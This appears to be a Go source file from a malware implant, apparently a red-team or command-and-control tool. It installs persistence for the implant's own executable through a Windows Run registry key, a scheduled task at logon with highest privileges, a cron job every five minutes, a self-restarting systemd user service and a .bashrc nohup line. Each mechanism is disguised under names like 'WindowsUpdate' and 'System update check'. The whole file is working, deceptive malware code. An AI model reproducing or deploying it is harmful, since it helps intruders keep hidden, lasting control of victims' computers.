package implant

import (
	"fmt"
	"os"
	"path/filepath"
	"runtime"
)

// InstallPersistence installs a persistence mechanism.
// Methods: registry, schtask, cron, service, bashrc
func InstallPersistence(method string) ([]byte, error) {
	exe, err := os.Executable()
	if err != nil {
		return nil, fmt.Errorf("get executable path: %w", err)
	}

	switch method {
	case "registry":
		if runtime.GOOS != "windows" {
			return nil, fmt.Errorf("registry persistence is Windows-only")
		}
		return persistRegistry(exe)
	case "schtask":
		if runtime.GOOS != "windows" {
			return nil, fmt.Errorf("schtask persistence is Windows-only")
		}
		return persistScheduledTask(exe)
	case "cron":
		if runtime.GOOS == "windows" {
			return nil, fmt.Errorf("cron persistence is Linux/macOS-only")
		}
		return persistCron(exe)
	case "service":
		if runtime.GOOS == "windows" {
			return nil, fmt.Errorf("systemd service persistence is Linux-only")
		}
		return persistSystemdService(exe)
	case "bashrc":
		if runtime.GOOS == "windows" {
			return nil, fmt.Errorf("bashrc persistence is Linux/macOS-only")
		}
		return persistBashrc(exe)
	default:
		return nil, fmt.Errorf("unknown persistence method: %s (available: registry, schtask, cron, service, bashrc)", method)
	}
}

// ── Windows ──

func persistRegistry(exe string) ([]byte, error) {
	// Add to HKCU\Software\Microsoft\Windows\CurrentVersion\Run
	cmd := fmt.Sprintf(`reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdate" /t REG_SZ /d "%s" /f`, exe)
	output, err := ExecuteShell([]string{cmd})
	if err != nil {
		return nil, fmt.Errorf("registry persistence failed: %w", err)
	}
	return append([]byte("[+] Registry persistence installed (HKCU Run key)\n"), output...), nil
}

func persistScheduledTask(exe string) ([]byte, error) {
	cmd := fmt.Sprintf(`schtasks /create /tn "WindowsUpdate" /tr "%s" /sc onlogon /rl highest /f`, exe)
	output, err := ExecuteShell([]string{cmd})
	if err != nil {
		return nil, fmt.Errorf("scheduled task persistence failed: %w", err)
	}
	return append([]byte("[+] Scheduled task persistence installed\n"), output...), nil
}

// ── Linux ──

func persistCron(exe string) ([]byte, error) {
	// Add cron job that runs every 5 minutes
	cronEntry := fmt.Sprintf("*/5 * * * * %s &", exe)
	cmd := fmt.Sprintf(`(crontab -l 2>/dev/null; echo "%s") | sort -u | crontab -`, cronEntry)
	output, err := ExecuteShell([]string{cmd})
	if err != nil {
		return nil, fmt.Errorf("cron persistence failed: %w", err)
	}
	return append([]byte("[+] Cron persistence installed (every 5 minutes)\n"), output...), nil
}

func persistSystemdService(exe string) ([]byte, error) {
	homeDir, _ := os.UserHomeDir()
	serviceDir := filepath.Join(homeDir, ".config", "systemd", "user")
	servicePath := filepath.Join(serviceDir, "update-service.service")

	serviceContent := fmt.Sprintf(`[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
ExecStart=%s
Restart=always
RestartSec=30

[Install]
WantedBy=default.target
`, exe)

	if err := os.MkdirAll(serviceDir, 0755); err != nil {
		return nil, fmt.Errorf("create systemd dir: %w", err)
	}

	if err := os.WriteFile(servicePath, []byte(serviceContent), 0644); err != nil {
		return nil, fmt.Errorf("write service file: %w", err)
	}

	// Enable and start
	ExecuteShell([]string{"systemctl --user daemon-reload"})
	ExecuteShell([]string{"systemctl --user enable update-service.service"})
	ExecuteShell([]string{"systemctl --user start update-service.service"})

	return []byte(fmt.Sprintf("[+] Systemd user service installed: %s\n", servicePath)), nil
}

func persistBashrc(exe string) ([]byte, error) {
	homeDir, _ := os.UserHomeDir()
	bashrcPath := filepath.Join(homeDir, ".bashrc")

	entry := fmt.Sprintf("\n# System update check\nnohup %s > /dev/null 2>&1 &\n", exe)

	f, err := os.OpenFile(bashrcPath, os.O_APPEND|os.O_WRONLY, 0644)
	if err != nil {
		return nil, fmt.Errorf("open .bashrc: %w", err)
	}
	defer f.Close()

	if _, err := f.WriteString(entry); err != nil {
		return nil, fmt.Errorf("write .bashrc: %w", err)
	}

	return []byte("[+] Bashrc persistence installed\n"), nil
}
